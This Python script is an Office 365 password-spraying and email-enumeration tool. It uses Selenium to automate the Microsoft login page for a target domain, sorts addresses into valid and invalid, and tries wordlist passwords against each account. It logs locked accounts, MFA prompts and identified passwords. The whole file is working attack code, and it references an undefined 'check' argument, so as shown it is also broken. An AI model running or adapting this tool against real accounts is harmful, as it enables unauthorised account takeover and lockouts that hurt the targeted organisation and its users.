#!/bin/python

import platform
import os
import sys
import time
import argparse
import random
import traceback
from selenium import webdriver
from difflib import SequenceMatcher


parser = argparse.ArgumentParser(description='Used to carry out password attacks on Office 365, or validate email addresses.')
parser.add_argument('--emails', help='Filename, list of emails', required=True)
parser.add_argument('--verbose', help='Enable verbose', required=False, action='store_true')
parser.add_argument('--validateOnly', help='validate Email Addresses Only, no passwords submitted', required=False, action='store_true')
parser.add_argument('--version', help='Check script version', required=False, action='store_true')
parser.add_argument('--domain', help='Target domain', required=True)
parser.add_argument('--VERSION_CONST', help=argparse.SUPPRESS, required=False)
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('--passwords', help='Filename, list of passwords')
group.add_argument('--password', help='Single password')

args = vars(parser.parse_args())

version = '1.1'
args['VERSION_CONST'] = version

exec_path, filename = os.path.split(os.path.abspath(__file__))
exec_path = exec_path + "/doc/driver"
operating_system = platform.system()

if operating_system == 'Linux':
    exec_path = exec_path + '/chromedriverLINUX'
elif operating_system == 'Darwin':
    exec_path = exec_path + '/chromedriverMAC'
else:
    print('The OS {} is not supported. Please request integration via GitHub https://github.com/darryllane/365PasswordAttack/issues'.format(operating_system))
    

def errorCheck(browser):
    try:
        
        browser.find_element_by_class_name("ext-error")
        return True
    except Exception as e:
        if 'Unable to locate element' in e.args:
            pass
        return False
        


#Gather file content
def get_content(filename):
    try:
        name_list = [line.rstrip('\n') for line in open(filename)]
        return name_list
    except IOError:
        print('The filename: {} doesn\'t seem to exist'.format(filename))
    except Exception:
        print(traceback.print_exc())        


def versions(browser):
    # Match Chrome and Driver version
    def similar(browser):
        browser_v = browser.capabilities['browserVersion'].rsplit('.', 1)[0]
        chromeD_v = browser.capabilities['chrome']['chromedriverVersion'].split(' ')[0].rsplit('.', 1)[0]
        percentage = SequenceMatcher(None, browser_v, chromeD_v).ratio()
        return (percentage, [browser_v, chromeD_v])
    return similar(browser)


#Selenium driver carries out autodiscover and attack.
def worker_list(emails, passwords, domain):
    ignore_list_InAzure = []
    ignore_listNotInAzure = []
    vip_ignore = []
    locked = []
    results = []    
    print('\nAttempting Password Attacks On Office 365\n')
    if args['verbose']:
        print('Target Domain: {}\n'.format(domain))
    if args['validateOnly']:
        print('validateOnly Email Addresses Only Mode\n')    
    
    link = 'http://autodiscover.{}'.format(domain)
    try:
        random.shuffle(emails)

        for email in emails:
            if email in locked or email in ignore_list_InAzure or email in ignore_listNotInAzure or email in vip_ignore:
                pass
            else:
                
                browser.get(link)
                time.sleep(4)
                try:
                    if browser.find_element_by_class_name("refreshPageButton"):
                        browser.find_element_by_class_name("refreshPageButton").click()
                        time.sleep(2)
                except Exception:
                    pass
                if 'Repeating redirects detected.' in browser.page_source:
                    browser.delete_all_cookies()
                    continue                 
                username = browser.find_element_by_name("loginfmt")
                time.sleep(2)       
                username.send_keys(email)
                time.sleep(0.5)
                browser.find_element_by_class_name("ext-primary").click()
                time.sleep(3)
                                 
                if errorCheck(browser):
                    error_check = browser.find_element_by_class_name("ext-error")
                    if 'isn\'t in our system. Make sure that you typed it correctly.' in error_check.text:
                        print('Incorrect Username: {}'.format(email))
                        if args['verbose']:
                            print('Doesn\'t Exist:\t{}'.format(email.lower()))
                        continue
                    if '500' in error_check.text:
                        browser.delete_all_cookies()
                        continue                      
                    elif 'This username may be incorrect' in error_check.text:
                        if args['validateOnly']:
                            print('Invalid Address: {}'.format(email.lower()))
                        else:
                            print('Incorrect Username: {}'.format(email))
                        continue
                    elif 'Your account or password is incorrect' in error_check.text:
                        print('Incorrect Password')
                if browser.find_elements_by_id('aadTile'):
                    browser.find_element_by_id('aadTile').click()
                    time.sleep(3)
                
                if not args['check']:
                    pass_count = len(passwords)
                    
                   
                    if args['validateOnly']:
                        print('Valid Address: {}'.format(email.lower()))
                    else:    
                        for password in passwords:
                                              
                            print('Attempt: {}, {}'.format(pass_count, email))
                            pass_count -= 1
                            pass_word = browser.find_element_by_name("passwd")
                            time.sleep(1)
                            pass_word.send_keys(password)
                            time.sleep(1)                        
                            browser.find_element_by_class_name("ext-primary").click()
                            time.sleep(1)
                            if errorCheck(browser):
                                error_check = browser.find_element_by_class_name("ext-error")
                                if 'Your account or password is incorrect.' in error_check.text:
                                    if args['verbose']:
                                        print('{}\t{}\tFAILED!'.format(email.lower(), password))                        
                                    pass
                                elif 'isn\'t in our system. Make sure that you typed it correctly.' in error_check.text:
                                    print('Incorrect Username: {}'.format(email))
                                    if args['verbose']:
                                        print('Doesn\'t Exist:\t{}'.format(email.lower()))
                                    break
                                elif 'This username may be incorrect' in error_check.text:
                                    print('Incorrect Username: {}'.format(email))
                                    if args['verbose']:
                                        print('Doesn\'t Exist:\t{}'.format(email.lower()))
                                    break                
                                elif 'Your account has been temporarily locked' in error_check.text or 'Your account has been locked' in error_check.text:
                                    locked.append(email)
                                    if args['verbose']:
                                        print('{}\t{}\tLOCKED!'.format(email.lower(), password))
                                    else:
                                        print('Account Locked:\t{}'.format(email.lower()))
                                    browser.delete_all_cookies()
                                    break
                                elif 'Approve sign-in request' in  browser.page_source or 'Request denied' in browser.page_source:
                                    print('MFA In place: {}'.format(email.lower()))
                                elif 'Enter code' in  browser.page_source:
                                    print('MFA In place: {}'.format(email.lower()))                                
                                                      
                                else:
                                    
                                    if args['verbose']:
                                        print('{}\t{}\tPASS!'.format(email.lower(), password))                        
                                    else:
                                        print('Password Identified:\t{}\t{}'.format(password, email))
                                        browser.delete_all_cookies()
                                    results.append((password, email))
                                    break
                else:
                    print('Confirmed: {}'.format(email))
        return results           
    
    except Exception as e:
        if 'Unable to locate element' in e.args:
            pass
        print(traceback.print_exc())
        
if args['version']:
    print('Office 365 Password Attack\n\nversion: {}'.format(args['VERSION_CONST']))
    sys.exit()
    
emails = get_content(args['emails'])
domain = args['domain']

if args['passwords']:
    passwords = get_content(args['passwords'])
elif args['password']:
    passwords = [args['password']]
    

browser = webdriver.Chrome(executable_path=exec_path) 
check = versions(browser)
if check[0]:
    time.sleep(2)    
    results = worker_list(emails, passwords, domain)
    if results:
        browser.quit()
    else:
        if not args['validateOnly']:
            print('\nNo Passwords identified')
        browser.quit()
        sys.exit()
else:
    print('Browser version:{}\nDriver version is:{}\n\nPlease Update!'.format(check[1][0], check[1][1]))  

